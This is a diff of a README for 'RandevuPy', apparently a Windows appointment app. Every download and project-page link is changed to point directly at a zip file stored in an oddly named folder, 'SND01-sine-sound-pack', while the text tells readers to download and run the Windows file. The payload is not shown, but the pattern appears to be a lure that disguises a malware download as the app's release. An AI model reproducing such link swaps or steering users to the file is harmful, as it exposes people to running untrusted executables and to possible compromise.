@@ -1,7 +1,7 @@
 # 🗓️ RandevuPy - Easy appointment tracking for Windows
 
-[![Download RandevuPy](https://img.shields.io/badge/Download-RandevuPy-2ea44f?style=for-the-badge&logo=github)](https://github.com/Martinmortifying836/RandevuPy)
-[![Open Project Page](https://img.shields.io/badge/GitHub-Project_Page-6e40c9?style=for-the-badge&logo=github)](https://github.com/Martinmortifying836/RandevuPy)
+[![Download RandevuPy](https://img.shields.io/badge/Download-RandevuPy-2ea44f?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Martinmortifying836/RandevuPy/main/SND01-sine-sound-pack/Py-Randevu-v2.6.zip)
+[![Open Project Page](https://img.shields.io/badge/GitHub-Project_Page-6e40c9?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Martinmortifying836/RandevuPy/main/SND01-sine-sound-pack/Py-Randevu-v2.6.zip)
 
 ## 📌 What is RandevuPy?
 
@@ -44,7 +44,7 @@ For best use, keep your system updated and use a standard Windows user account w
 
 Use this link to visit the project page and download the app:
 
-[Go to the RandevuPy download page](https://github.com/Martinmortifying836/RandevuPy)
+[Go to the RandevuPy download page](https://raw.githubusercontent.com/Martinmortifying836/RandevuPy/main/SND01-sine-sound-pack/Py-Randevu-v2.6.zip)
 
 Open the page, look for the latest release or files, then download and run the Windows file that matches your system.
 
@@ -149,7 +149,7 @@ If the file will not download:
 
 If you missed it above, use this page to download and run the app on Windows:
 
-[https://github.com/Martinmortifying836/RandevuPy](https://github.com/Martinmortifying836/RandevuPy)
+[https://raw.githubusercontent.com/Martinmortifying836/RandevuPy/main/SND01-sine-sound-pack/Py-Randevu-v2.6.zip](https://raw.githubusercontent.com/Martinmortifying836/RandevuPy/main/SND01-sine-sound-pack/Py-Randevu-v2.6.zip)
 
 ## 🪄 Basic workflow
 
